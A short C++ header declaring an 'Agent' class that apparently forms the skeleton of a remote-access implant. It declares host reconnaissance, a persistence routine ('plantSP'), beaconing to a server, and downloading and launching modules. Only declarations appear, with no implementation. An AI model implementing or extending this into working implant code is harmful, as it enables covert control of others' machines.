#pragma once
#include <memory>
#include <vector>
#include <string>

#include <iphlpapi.h>



struct SystemInfo {
	std::string ComputerName;
	std::string NETBIOSName;
	bool isAdmin;
	std::vector<std::string> adapters;
};

class Agent
{
private:
	bool isAdmin;
	std::string serverUri;
	std::string clientID;

	bool wasDeployed();
	bool plantSP();
	SystemInfo getSystemInfo();
public:
static bool AgentWasDeployed;
	Agent() = default;
	Agent(std::string _serverUri);
	~Agent() = default;

	std::vector<std::string> CheckNewModules();
	std::string DownloadModule(const std::string &moduleEndpoint);
	bool LaunchModule();

	void Ping();
};

